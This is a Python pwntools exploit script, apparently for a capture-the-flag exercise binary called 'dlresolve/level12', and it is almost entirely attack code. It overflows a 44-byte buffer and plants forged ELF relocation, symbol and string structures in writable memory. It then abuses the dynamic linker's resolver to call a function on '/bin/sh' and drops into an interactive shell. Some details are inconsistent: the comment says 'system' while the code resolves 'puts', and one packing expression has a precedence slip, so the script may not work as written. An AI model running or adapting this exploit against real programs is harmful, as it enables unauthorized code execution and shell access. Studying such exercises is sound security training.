# -*- coding: utf-8 -*-

from pwn import *

pwnable_filename = "./dlresolve/level12"


def generate_io():
    # Io = remote("192.168.210.11", 10012)
    Io = process(pwnable_filename)
    return Io


def nice_print(name):
    variable = globals()[name]
    if isinstance(variable, int):
        if variable >> 16 > 0:
            print "[+] %s => %d => 0x%08x" % (name, variable, variable)
        elif variable >> 8 > 0:
            print "[+] %s => %d => 0x%04x" % (name, variable, variable)
        else:
            print "[+] %s => %d => 0x%02x" % (name, variable, variable)
    elif isinstance(variable, str):
        print "[+] %s => %s => %r" % (name, variable, variable)
    else:
        print "[+] %s => %s" % (name, variable)


def print_hex(data):
    for i in range(0, len(data), 4):
        print "0x%s" % (data[i:i + 4].encode("hex"))


pwnable = ELF(pwnable_filename)

junk_size = 44
split_line = "-" * 0x10

Io = generate_io()

fixed_writable_addr = 0x0804a020  # get it from gdb `vmmap`

plt_addr = 0x80482f0
rel_plt_addr = 0x080482b0

dynsym_addr = 0x80481cc
dynstr_addr = 0x804822c

pppr_addr = 0x080484e9
ppr_addr = 0x080484ea

'''
# fixed_writable_addr + 0
+-------------------------------+
|            r_offset           |
+-------------------------------+
|             i_info            |
+-------------------------------+
'''
r_offset = pwnable.got['read']
r_sym = (fixed_writable_addr + 8 - dynsym_addr) / 0x8
r_type = 7
r_info = r_sym << 8 | r_type
print("[%s Rel %s]" % (split_line, split_line))
nice_print("r_offset")
nice_print("r_sym")
nice_print("r_type")
nice_print("r_info")
fake_Elf32_Rel = "".join([
    p32(r_offset),
    p32(r_info),
])

'''
# fixed_writable_addr + len(Elf32_Rel)
# fixed_writable_addr + 8
+-------------------------------------------+
|                  st_name                  |
+-------------------------------------------+
|                  st_value                 |
+-------------------------------------------+
|                  st_size                  |
+-------------------------------------------+
|  st_info | st_other |       st_shndx      |
+-------------------------------------------+
'''
st_name = fixed_writable_addr + 8 + 16 - dynstr_addr
st_value = 0
st_size = 0
st_info = 0
st_other = 0
st_shndx = 0x12
print("[%s Sym %s]" % (split_line, split_line))
nice_print("st_name")
nice_print("st_value")
nice_print("st_size")
nice_print("st_info")
nice_print("st_other")
nice_print("st_shndx")
fake_Elf32_Sym = "".join([
    p32(st_name),
    p32(st_value),
    p32(st_size),
    p32(st_info << 24 + st_other << 16 + st_shndx),
])

'''
# fixed_writable_addr + len(Elf32_Rel) + len(Elf32_Sym)
# fixed_writable_addr + 8 + 16
+----------------+
| system\x00\x00 |
+----------------+
'''
symbol = "puts".ljust(8, "\x00")
fake_dynstr = "".join([
    symbol
])

'''
# fixed_writable_addr + len(Elf32_Rel) + len(Elf32_Sym) + len(fake_dynstr)
# fixed_writable_addr + 8 + 16 + 8
+----------------+
| /bin/sh\x00 |
+----------------+
'''
bin_sh = "/bin/sh\x00"
bin_sh_addr = fixed_writable_addr + 8 + 16 + 8

fake_data = "".join([
    fake_Elf32_Rel,
    fake_Elf32_Sym,
    fake_dynstr,
    bin_sh,
])

start_addr = 0x08048340


gdb.attach(proc.pidof(Io)[0], gdbscript='b read\nb *0x08048340\nb *0x080482F0\n')

stage1 = "".join([
    "A" * junk_size,
    p32(pwnable.plt['read']),
    p32(start_addr),
    p32(0),
    p32(fixed_writable_addr),
    p32(0x40),
]).rjust(0x40, "\x00")
print "[+] Stage 1: (%s)" % (len(stage1))
print_hex(stage1)
Io.send(stage1)
time.sleep(0.5)

stage2 = "".join([
    fake_data
]).rjust(0x40, "\x00")
print "[+] Stage 2: (%s)" % (len(stage2))
print_hex(stage2)
Io.send(stage2)
time.sleep(0.5)

stage3 = "".join([
    "B" * junk_size,
    p32(plt_addr),
    p32(fixed_writable_addr - rel_plt_addr),
    p32(bin_sh_addr),
])
print "[+] Stage 3: (%s)" % (len(stage3))
print_hex(stage3)
Io.send(stage3)
time.sleep(0.5)
Io.interactive()
